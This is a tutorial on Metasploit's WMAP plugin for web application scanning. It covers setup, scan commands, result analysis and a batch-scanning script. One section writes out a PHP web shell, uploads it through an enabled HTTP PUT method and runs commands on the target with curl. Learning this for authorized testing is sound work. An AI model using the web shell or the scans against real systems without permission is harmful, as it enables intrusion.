# Web Application Vulnerability Scanning with WMAP

## Overview

WMAP is a powerful web application vulnerability scanner integrated as a Metasploit framework plugin. It automates web server enumeration and vulnerability scanning, making it an essential tool for identifying security issues in web applications and server configurations.

## Key Features

- **Automated Web Server Enumeration**: Discovers directories, files, and server information
- **Vulnerability Detection**: Identifies common web vulnerabilities (SQL injection, XSS, etc.)
- **Metasploit Integration**: Seamlessly works with Metasploit framework and database
- **Modular Approach**: Utilizes built-in auxiliary modules for comprehensive testing
- **Profile-Based Scanning**: Automatically selects relevant modules based on target configuration

## Initial Setup

### Starting Required Services

```bash
# Start PostgreSQL database
sudo service postgresql start

# Launch Metasploit framework
msfconsole
```

### Workspace Configuration

```bash
# Create dedicated workspace
workspace -a web_scanning

# Set global RHOSTS variable
setg RHOSTS <target_ip>
```

## Loading and Configuring WMAP

### Loading the Plugin

```bash
# Load WMAP plugin
load wmap

# Verify successful loading
wmap_help
```

### Target Configuration

```bash
# Add target site
wmap_sites -a <target_ip>

# Add target URL for scanning
wmap_targets -t http://<target_ip>/

# Verify configuration
wmap_sites -l
wmap_targets -l
```

## Vulnerability Scanning Process

### Module Configuration

```bash
# Display enabled modules for target
wmap_run -t

# Example output:
# 39 WMAP enabled modules loaded
# SSL testing: Disabled (no SSL certificate detected)
# Web server testing: Enabled
# Directory brute forcing: Enabled
# SQL injection testing: Enabled
# HTTP traversal: Enabled
```

### Executing the Scan

```bash
# Run all enabled modules against target
wmap_run -e
```

## Analyzing Results

### Viewing Detected Vulnerabilities

```bash
# List all discovered vulnerabilities
wmap_vulns -l
```

### Key Information from Scan Results

- **HTTP Methods**: Enabled methods (GET, HEAD, POST, OPTIONS, etc.)
- **Directory Structure**: Discovered directories and files
- **Server Information**: Web server version and configuration
- **Potential Vulnerabilities**: Misconfigurations and security issues

## Practical Example: HTTP PUT Method Vulnerability

### Identifying the Vulnerability

During scanning, WMAP may identify enabled HTTP methods that could pose security risks:

```bash
# Check enabled HTTP methods
use auxiliary/scanner/http/http_options
set RHOSTS <target_ip>
run

# Example output:
# Enabled HTTP Methods: GET, HEAD, POST, OPTIONS
```

### Exploiting HTTP PUT Method

```bash
# Load HTTP PUT testing module
use auxiliary/scanner/http/http_put

# Configure for vulnerable directory
set RHOSTS <target_ip>
set PATH /data/
set FILENAME test_upload.txt
set FILEDATA "Test file content"
run

# Successful output:
# File uploaded successfully
```

### Verification

```bash
# Verify file upload using curl
curl http://<target_ip>/data/test_upload.txt
```

## Advanced Usage Examples

### Dynamic Target Scanning Script

```bash
#!/bin/bash
# wmap_automation.sh
TARGETS_FILE="web_targets.txt"
WORKSPACE_PREFIX="scan_$(date +%Y%m%d)"

while IFS= read -r target; do
    echo "Scanning target: $target"
    msfconsole -x "
        workspace -a ${WORKSPACE_PREFIX}_${target};
        setg RHOSTS $target;
        load wmap;
        wmap_sites -a $target;
        wmap_targets -t http://$target/;
        wmap_run -e;
        exit"
done < "$TARGETS_FILE"
```

### Targeted Module Execution

```bash
# Run specific module categories
wmap_run -m "scanner/http"

# Focus on SQL injection testing
wmap_run -m "scanner/http/sql"
```

## Real-World Lab Environment

### PortSwigger Web Security Academy

- **Lab URL**: [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- **Access**: Completely free
- **Features**: Various vulnerable web applications for testing

### TryHackMe Web Application Security

- **Lab URL**: [TryHackMe Web Application Fundamentals](https://tryhackme.com/module/web-application-fundamentals)
- **Access**: Free account required
- **Description**: Practical web application security challenges

## Advanced Vulnerability Exploitation

### Web Shell Upload Scenario

```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload using HTTP PUT
use auxiliary/scanner/http/http_put
set RHOSTS <target_ip>
set PATH /data/
set FILENAME shell.php
set FILEDATA '<?php system($_GET["cmd"]); ?>'
run

# Execute commands via web shell
curl "http://<target_ip>/data/shell.php?cmd=whoami"
```

### Comprehensive Testing Workflow

```bash
# Complete WMAP workflow
msfconsole -x "
workspace -a comprehensive_scan;
setg RHOSTS <target_ip>;
load wmap;
wmap_sites -a <target_ip>;
wmap_targets -t http://<target_ip>/;
wmap_targets -t https://<target_ip>/;
wmap_run -t;
wmap_run -e;
wmap_vulns -l;
exit"
```

## Best Practices

### Scan Configuration

- Always use dedicated workspaces for different assessments
- Set global variables to avoid repetitive configuration
- Review enabled modules before execution
- Schedule intensive scans during off-peak hours

### Result Management

- Export findings using Metasploit database commands
- Document false positives for future reference
- Correlate WMAP results with manual testing
- Prioritize vulnerabilities based on risk assessment

### Performance Optimization

```bash
# Adjust scan intensity
set THREADS 10

# Limit scan scope
wmap_targets -t http://<target_ip>/specific_path/

# Use specific module profiles
wmap_run -m "scanner/http/dir_scanner"
```

## Common Output Analysis

### Directory Enumeration Results

```
[+] Found directory: /data/ 200
[+] Found directory: /secure/ 200
[+] Found directory: /downloads/ 200
[+] Found file: /test.php 200
```

### Vulnerability Indicators

```
[+] HTTP PUT method allowed on /data/
[+] SQL injection potential in parameter 'id'
[+] Cross-site scripting in search functionality
[+] Directory traversal vulnerability detected
```

## Troubleshooting

### Common Issues

- **Plugin not loading**: Verify Metasploit installation and dependencies
- **No results**: Check target connectivity and service availability
- **Module failures**: Review module options and target compatibility
- **Database errors**: Ensure PostgreSQL service is running

### Useful Commands

```bash
# Reset WMAP configuration
wmap_sites -d <site_id>
wmap_targets -c

# View scan progress
wmap_run -s

# Export results
db_export -f xml wmap_scan_results.xml
```

This WMAP workflow demonstrates how automated web application vulnerability scanning can efficiently identify security issues, with particular focus on misconfigurations like insecure HTTP methods that can lead to serious compromises if exploited.
